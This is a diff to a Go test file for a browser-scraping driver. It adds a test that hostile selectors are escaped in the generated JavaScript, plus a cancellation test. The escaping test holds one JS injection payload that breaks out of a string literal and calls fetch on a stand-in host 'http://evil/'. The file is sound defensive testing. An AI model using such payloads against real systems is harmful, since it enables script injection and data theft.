@@ -4,6 +4,7 @@ import (
 	"context"
 	"encoding/json"
 	"errors"
+	"regexp"
 	"strings"
 	"testing"
 
@@ -244,6 +245,92 @@ func TestCmuxDriverDefaultRunnerIsExec(t *testing.T) {
 	if _, ok := d.runner.(cmux.ExecRunner); !ok {
 		t.Errorf("default runner = %T, want cmux.ExecRunner", d.runner)
 	}
+}
+
+// TestBuildExtractionJSEscapesMaliciousSelector is the negative-path
+// security test the design review demanded (🔴 #4): a hostile
+// browser.toml selector containing `"`, `\`, or sequences that look
+// like a JS string-literal close MUST stay quoted inside the generated
+// JS. We verify the generated payload (a) contains the literal
+// attacker substring nowhere outside a quoted region, and (b) is
+// syntactically a valid JS expression we can parse a JSON.stringify
+// invocation out of.
+//
+// We assert the absence of the dangerous unquoted token sequence (e.g.
+// "); fetch") rather than execute the JS — production execution
+// happens via cmux which is out of scope for unit tests.
+func TestBuildExtractionJSEscapesMaliciousSelector(t *testing.T) {
+	t.Parallel()
+
+	hostile := `"); fetch('http://evil/'); //`
+	target := ScrapeTarget{
+		URL:          "https://example.com/",
+		ItemSelector: hostile,
+		Fields: map[string]FieldRule{
+			"id":   {Selector: hostile, Attr: "data-id"},
+			"name": {Selector: ".n", Attr: hostile},
+		},
+	}
+	js := buildExtractionJS(target)
+
+	// The dangerous form is a quote that breaks out of the JS string
+	// literal — i.e. a `"` NOT preceded by an escaping `\`. The regex
+	// matches `"); fetch` only when the leading `"` is unescaped (no
+	// preceding `\`). Note we deliberately use `[^\\]` (negated single
+	// char) rather than a lookbehind because Go's regexp engine has no
+	// lookaround support; a position-0 hostile match is impossible
+	// anyway because the JS template wraps everything in
+	// `JSON.stringify(...)`.
+	bareBreakOut := regexp.MustCompile(`[^\\]"\); fetch`)
+	if bareBreakOut.MatchString(js) {
+		t.Errorf("unescaped quote-closing sequence found in generated JS — escaping bypassed:\n%s", js)
+	}
+	// Belt-and-braces: the canonical escape form (\") MUST appear,
+	// proving the encoder ran on our input.
+	if !strings.Contains(js, `\"`) {
+		t.Errorf("generated JS missing \\\" escape — encoder may have been bypassed:\n%s", js)
+	}
+}
+
+// TestCmuxDriverHonoursContextCancelBetweenSteps closes the design-
+// review gap noted in M4: ctx cancel between the goto step and the
+// eval step must short-circuit, otherwise a slow goto followed by
+// shutdown leaves a stray eval running.
+func TestCmuxDriverHonoursContextCancelBetweenSteps(t *testing.T) {
+	t.Parallel()
+
+	ctx, cancel := context.WithCancel(context.Background())
+	runner := &cancelOnGotoRunner{cancel: cancel}
+	d := NewCmuxDriver(WithCmuxRunner(runner))
+	_, err := d.Scrape(ctx, ScrapeTarget{
+		URL:          "https://example.com/",
+		ItemSelector: ".x",
+		Fields:       map[string]FieldRule{"id": {Selector: "[data-id]", Attr: "data-id"}},
+	})
+	if !errors.Is(err, context.Canceled) {
+		t.Fatalf("err = %v, want context.Canceled", err)
+	}
+	if runner.evalSeen {
+		t.Errorf("eval ran after ctx cancel — driver did not honour cancellation between steps")
+	}
+}
+
+// cancelOnGotoRunner cancels the supplied ctx as soon as it sees the
+// goto call, then records whether any subsequent call (which would be
+// eval) ran. Honouring the cancel means the second Run never gets
+// invoked.
+type cancelOnGotoRunner struct {
+	cancel   context.CancelFunc
+	evalSeen bool
+}
+
+func (r *cancelOnGotoRunner) Run(_ context.Context, _ string, args ...string) ([]byte, []byte, error) {
+	if len(args) >= 2 && args[0] == "browser" && args[1] == "goto" {
+		r.cancel()
+		return nil, nil, nil
+	}
+	r.evalSeen = true
+	return []byte("[]"), nil, nil
 }
 
 func sliceContains(xs []string, want string) bool {
